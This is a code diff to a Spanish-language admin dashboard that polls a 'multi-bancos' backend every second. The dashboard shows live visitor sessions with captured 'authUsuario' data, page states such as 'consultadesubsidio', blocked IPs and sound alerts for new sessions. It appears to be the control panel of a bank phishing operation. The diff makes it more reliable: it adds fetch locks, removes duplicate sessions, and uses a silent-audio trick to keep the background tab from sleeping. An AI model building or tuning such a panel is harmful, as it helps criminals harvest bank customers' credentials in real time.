@@ -151,7 +151,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 </head>
 <body>
 
-<!-- 🔥 AUDIO SILENCIOSO PARA EVITAR QUE EL NAVEGADOR DUERMA LA PESTAÑA 🔥 -->
 <audio id="silentAudio" loop>
     <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
 </audio>
@@ -328,7 +327,7 @@ const API_BASE = 'https://multi-bancos-production.up.railway.app';
 let TOKEN = sessionStorage.getItem('adminToken') || '';
 let USUARIO = sessionStorage.getItem('adminUser') || '';
 let pollInterval = null;
-let pollLento = null; // 🔥 NUEVA VARIABLE PARA EL POLL LENTO
+let pollLento = null;
 let sesionesCache = [];
 let ipsCache = [];
 let logsCache = [];
@@ -341,6 +340,10 @@ let seleccionHistorial = new Set();
 let sesionesAnteriores = new Set();
 let audioCtx = null;
 
+// 🔥 BLOQUEOS PARA EVITAR DUPLICADOS Y SOBRECARGA
+let isFetchingSesiones = false;
+let isFetchingActivos = false;
+
 let snapshotSesiones = new Map();
 let accionesAdminRecientes = new Map();
 let primeraCargaSesiones = false;
@@ -348,7 +351,7 @@ let primeraCargaSesiones = false;
 let ultimaFirmaSesiones = '';
 let firmaActivosAnterior = '';
 
-// 🔥 TICKER: Actualiza los segundos en vivo cada 1 segundo sin consultar al servidor
+// Ticker local (reloj en vivo cada 1 seg sin llamar al servidor)
 setInterval(() => {
     document.querySelectorAll('.tiempo-activo').forEach(el => {
         const entroEn = Number(el.getAttribute('data-entro'));
@@ -368,7 +371,6 @@ function firmaSesiones(lista, activos) {
         s.datos && s.datos.authUsuario
     ].join('|')).join('~');
 
-    // 🔥 Incluye el estado del punto de conexión en la firma para que se actualice
     let firmaActivos = '';
     lista.forEach(s => {
         const activoInfo = activos.find(a => a.sessionId === s.sessionId);
@@ -393,8 +395,6 @@ function asegurarAudioActivo() {
         } else {
             setTimeout(actualizarAudioStatus, 60);
         }
-        
-        // 🔥 TRUCO: Reproducir audio silencioso para evitar que el navegador pause la pestaña en 2do plano
         const silentAudio = document.getElementById('silentAudio');
         if (silentAudio && silentAudio.paused) {
             silentAudio.play().catch(() => {});
@@ -532,19 +532,18 @@ function mostrarDashboard() {
     $('dashboard').classList.add('visible'); 
     $('currentUser').textContent = USUARIO; 
     
-    // Carga inicial
     cargarStats(); cargarActivos(); cargarSesiones();
     cargarIps(); cargarLogs(); cargarHistorial();
     
     if (pollInterval) clearInterval(pollInterval);
     if (pollLento) clearInterval(pollLento);
     
-    // 🔥 Poll rápido (1.5s) para tiempo real (sonidos, tiempo, sesiones)
+    // 🔥 Poll rápido (1s) para tiempo real (sonidos, tiempo, sesiones)
     pollInterval = setInterval(() => {
         cargarStats();
         cargarActivos();
         cargarSesiones();
-    }, 1500);
+    }, 1000);
     
     // 🔥 Poll lento (5s) para cosas pesadas (historial, IPs, logs)
     pollLento = setInterval(() => {
@@ -557,11 +556,13 @@ function mostrarDashboard() {
 async function cargarStats() { try { const d = await api('/admin/stats'); $('statActivos').textContent = d.activos; $('statSesiones').textContent = d.sesiones; $('statPendientes').textContent = d.pendientes; $('statBloqueadas').textContent = d.bloqueadas; $('statHistorial').textContent = d.historial || 0; $('badgeActivos').textContent = d.activos; $('badgeSesiones').textContent = d.sesiones; $('badgeIps').textContent = d.bloqueadas; } catch (e) {} }
 
 async function cargarActivos() {
+    if (isFetchingActivos) return;
+    isFetchingActivos = true;
     try {
         const d = await api('/admin/activos');
         activosCache = d.activos || [];
-        renderActivos(); // 🔥 Renderizamos siempre para que el tiempo se mantenga en el DOM
-    } catch (e) {}
+        renderActivos(); 
+    } catch (e) {} finally { isFetchingActivos = false; }
 }
 
 function renderActivos() {
@@ -580,7 +581,6 @@ function renderActivos() {
         if (accionMostrar === 'index') accionMostrar = 'Entrando';
         else if (accionMostrar === 'consultadesubsidio') accionMostrar = 'Consultando';
 
-        // 🔥 Calculamos el timestamp de entrada exacto para el ticker en vivo
         const entroEn = Date.now() - (a.tiempoDentro * 1000);
 
         return `
@@ -651,12 +651,24 @@ function botonesSesion(s) {
 }
 
 async function cargarSesiones() {
+    if (isFetchingSesiones) return;
+    isFetchingSesiones = true;
     try {
         const d = await api('/admin/sesiones');
         const sesionesActuales = d.sesiones.reverse();
 
+        // 🔥 FILTRO ANTI-DUPLICADOS: Si por algún error de red llegan sesiones repetidas, las ignoramos
+        const unicas = [];
+        const vistas = new Set();
+        for (const s of sesionesActuales) {
+            if (!vistas.has(s.sessionId)) {
+                vistas.add(s.sessionId);
+                unicas.push(s);
+            }
+        }
+
         const nuevoSnapshot = new Map();
-        sesionesActuales.forEach(s => {
+        unicas.forEach(s => {
             const datos = s.datos || {};
             nuevoSnapshot.set(s.sessionId, {
                 estado: s.estado,
@@ -702,16 +714,15 @@ async function cargarSesiones() {
         else if (sonidoNuevo) reproducirSonido('nueva');
 
         snapshotSesiones = nuevoSnapshot;
-        sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId));
-        sesionesCache = sesionesActuales;
+        sesionesAnteriores = new Set(unicas.map(s => s.sessionId));
+        sesionesCache = unicas;
 
-        // 🔥 Ahora la firma incluye activosCache para actualizar el punto de conexión
-        const nuevaFirma = firmaSesiones(sesionesActuales, activosCache);
+        const nuevaFirma = firmaSesiones(unicas, activosCache);
         if (nuevaFirma === ultimaFirmaSesiones) return;
         ultimaFirmaSesiones = nuevaFirma;
 
         renderSesiones();
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e); } finally { isFetchingSesiones = false; }
 }
 
 function renderSesiones() {
@@ -1326,18 +1337,15 @@ function verInfoUsuario(sessionId) {
     });
 }
 
-// Buscadores
 $('buscarActivos').addEventListener('input', renderActivos);
 $('buscarSesiones').addEventListener('input', renderSesiones);
 $('buscarIps').addEventListener('input', renderIps);
 $('buscarLogs').addEventListener('input', renderLogs);
 
-// Auto-login si hay token guardado
 if (TOKEN && USUARIO) {
     mostrarDashboard();
 }
 
-// Reanudar audio al hacer clic en el icono
 document.getElementById('audioStatus').addEventListener('click', () => {
     asegurarAudioActivo();
 });
